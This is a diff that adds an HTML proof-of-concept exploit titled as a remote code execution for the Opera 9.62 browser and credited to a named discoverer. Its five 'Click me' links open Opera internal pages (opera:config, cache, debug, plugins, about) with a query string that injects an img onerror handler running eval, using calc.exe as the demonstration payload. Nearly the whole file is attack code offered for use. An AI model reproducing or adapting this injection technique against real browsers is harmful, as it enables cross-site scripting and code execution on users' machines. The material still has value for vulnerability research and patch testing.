@@ -1,0 +1,53 @@
+&lt;!--
+# OPERA 9.62 Remote Code Execution
+# Vulnerability Found By NeoCoderz
+# Email : NeoCoderz1[at]msn[dot]com
+--&gt;
+&lt;html&gt;
+&lt;script&gt;
+function execcalc() {
+  var abc=&quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;;
+  window.open(&#039;opera:config?q=q=%2A&quot;&gt;&lt;img src=\&#039;x\&#039; onerror=\&#039;eval(abc)\&#039;&gt;&amp;p=1&amp;s=1&#039;);
+  window.setTimeout(&quot;location.href=&#039;mailto:&#039;&quot;,4000);
+}
+&lt;/script&gt;
+&lt;body scrolling=&quot;no&quot;&gt;
+&lt;a href=&quot;#&quot; onclick=&quot;execcalc()&quot;&gt;Click me...(opera:config)&lt;/a&gt;&lt;br&gt;
+&lt;script&gt;
+function execcalca() {
+  var abc=&quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;;
+  window.open(&#039;opera:cache?q=%2A&quot;&gt;&lt;img src=\&#039;x\&#039; onerror=\&#039;eval(abc)\&#039;&gt;&amp;p=1&amp;s=1&#039;);
+  window.setTimeout(&quot;location.href=&#039;mailto:&#039;&quot;,4000);
+}
+&lt;/script&gt;
+&lt;body scrolling=&quot;no&quot;&gt;
+&lt;a href=&quot;#&quot; onclick=&quot;execcalca()&quot;&gt;Click me...(opera:cache)&lt;/a&gt;&lt;br&gt;
+&lt;script&gt;
+function execcalcb() {
+  var abc=&quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;;
+  window.open(&#039;opera:debug?q=q=%2A&quot;&gt;&lt;img src=\&#039;x\&#039; onerror=\&#039;eval(abc)\&#039;&gt;&amp;p=1&amp;s=1&#039;);
+  window.setTimeout(&quot;location.href=&#039;mailto:&#039;&quot;,4000);
+}
+&lt;/script&gt;
+&lt;body scrolling=&quot;no&quot;&gt;
+&lt;a href=&quot;#&quot; onclick=&quot;execcalcb()&quot;&gt;Click me...(opera:debug)&lt;/a&gt;&lt;br&gt;
+&lt;script&gt;
+function execcalcc() {
+  var abc=&quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;;
+  window.open(&#039;opera:plugins?q=%2A&quot;&gt;&lt;img src=\&#039;x\&#039; onerror=\&#039;eval(abc)\&#039;&gt;&amp;p=1&amp;s=1&#039;);
+  window.setTimeout(&quot;location.href=&#039;mailto:&#039;&quot;,4000);
+}
+&lt;/script&gt;
+&lt;body scrolling=&quot;no&quot;&gt;
+&lt;a href=&quot;#&quot; onclick=&quot;execcalcc()&quot;&gt;Click me...(opera:plugins)&lt;/a&gt;&lt;br&gt;
+&lt;script&gt;
+function execcalcd() {
+  var abc=&quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;;
+  window.open(&#039;opera:about?q=%2A&quot;&gt;&lt;img src=\&#039;x\&#039; onerror=\&#039;eval(abc)\&#039;&gt;&amp;p=1&amp;s=1&#039;);
+  window.setTimeout(&quot;location.href=&#039;mailto:&#039;&quot;,4000);
+}
+&lt;/script&gt;
+&lt;body scrolling=&quot;no&quot;&gt;
+&lt;a href=&quot;#&quot; onclick=&quot;execcalcd()&quot;&gt;Click me...(opera:about)&lt;/a&gt;&lt;br&gt;
+&lt;/html&gt;
+
